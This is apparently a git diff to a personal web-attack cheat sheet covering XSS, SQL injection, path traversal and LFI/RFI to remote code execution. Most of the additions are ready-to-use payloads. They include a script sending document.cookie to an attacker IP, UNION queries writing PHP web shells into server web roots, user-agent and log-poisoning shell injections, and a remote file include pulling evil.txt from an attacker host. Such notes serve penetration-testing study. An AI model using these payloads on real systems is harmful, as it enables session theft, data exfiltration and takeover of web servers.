@@ -4,6 +4,7 @@
 * [Command Injection](#Cinject)
 * [Directory Path Traversal](#pathtrav)
 * [LFI to RCE](#lfi2rce)
+* [RFI to RCE](#rfi2rce)
 
 
 
@@ -83,11 +84,31 @@ Execution sink eval call error
   
   `{{$on.constructor('alert(1)')()}}`
  
- 
+
+## Redirection
+
+`<iframe SRC="http://<IP>/report" height = "0" width ="0"></iframe>`
+
+```
+<script> new Image().src="http://10.11.0.5/bogus.php?output="+document.cookie; </script>
+```
+
+
+
 # **<a name="SQLi">SQLi</a>**
 
-`xyz' OR 1=1--`
-
+#### Injections to try
+```
+'
+"
+`
+''
+""
+```
+`xyz' OR 1=1--`   
+`xyz" or 1=1 #`   
+`xyz' or 'a'='a`   
+`xyz')or('a'='a`   
 
 ## Cheatsheats
 
@@ -148,7 +169,7 @@ Execution sink eval call error
 
 |Title    | Conditional Time Delays |  
 | --------- | ------------- |
-|Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
+|Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
 |Microsoft | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |  
 |PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
 |MySQL | `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')` |
@@ -189,12 +210,6 @@ Concat
 
 `GET /filter?category=Pets'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users--+ HTTP/1.1`
 
-|Title    | concat method |  
-| --------- | ------------- |
-|Oracle | `'foo' \|\| 'bar'` |  
-|Microsoft | `'foo'+'bar'` |  
-|PostgreSQL | `'foo' \|\| 'bar'` |
-|MySQL | `foo' 'bar'` or `CONCAT('foo','bar')` |  
 
 ### Enumeration
 MySQL
@@ -238,6 +253,31 @@ Oracle
 `'+UNION+SELECT+COLUMN_NAME,NULL+FROM+all_tab_columns+WHERE+table_name+=+'USERS_LWSCID'+--+`
 
 `'+UNION+SELECT+USERNAME_MYUNOL,+PASSWORD_GETKJX+FROM+USERS_LWSCID+--+`
+
+### Code Injection
+
+`UNION+ALL+SELECT+NULL,+NULL,LOAD_FILE('C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS')+--+`
+
+`union all select 1,2,3,4,"<?php echo
+shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'`
+
+
+Create a file to execute a single command:
+
+```
+" union select "<?php system(\"ping -c 4 10.10.10.60\");","","","","","" into outfile "/var/www/html/filename.php" #
+```
+Make the output prettier:
+
+```
+" union select "<?php system(\"echo '<pre>'; ping -c 4 10.10.10.60\");","","","","","" into outfile "/var/www/html/filename.php" #
+```
+Make a command injection page:
+
+```
+" union select "<?php if (isset($_REQUEST['cmd'])){ echo '<pre>'; system($_REQUEST['cmd']); echo '</pre>'; } ?><form action=<?php echo basename($_SERVER['PHP_SELF'])?>> <input type=text name=cmd size=20> <input type=submit></form>","","","","","" into outfile "/var/www/html/filename.php" #
+```
+
 
 ## Blind  
 ### Conditional Responses
@@ -296,7 +336,7 @@ Tests by putting output to a web viewable directory
 
 
 
-# **<a name="pathtrav">Directory Path Traversal</a>**
+# **<a name="pathtrav">Directory Path Traversal aka LFI </a>**
 
 `GET /image?filename=../../../etc/passwd HTTP/1.1`
 
@@ -325,6 +365,8 @@ odd characters or double encoded
 
 # **<a name="lfi2rce">LFI to RCE</a>**
 
+
+
 ## Log Poisoning
 
 Include the following in a GET request and when you view the access.log file it will show the php info verison  
@@ -352,6 +394,10 @@ should be limited shell
 
 `curl localhost/test.php -d vipertooth=whoami`
 
+or 
+
+`<?php echo shell_exec($_GET['cmd']);?>`
+
 
 ## Proc Environ Injection
 
@@ -360,7 +406,20 @@ Testing
 http://secureapplication.example/index.php?view=../../../proc/self/environ
 `  
 
-if it works put `GET /<?php system($_GET['cmd']);?>` in the user-agent field then run request 2 like payload
+if it works put `<?php system($_GET['cmd']);?>` in the user-agent field then run request with 
+` curl 
+http://secureapplication.example/index.php?view=../../../proc/self/environ&cmd=ipconfig
+` 
+
+# **<a name="rfi2rce">RFI to RCE</a>**
+
+`http://<IP>/something.php?name=a&comment=b&LANG=http://<attackIP>/evil.txt`
+
+```
+cat evil.txt
+<?php echo shell_exec("ipconfig");?>
+```
+
 
 Referances:
 
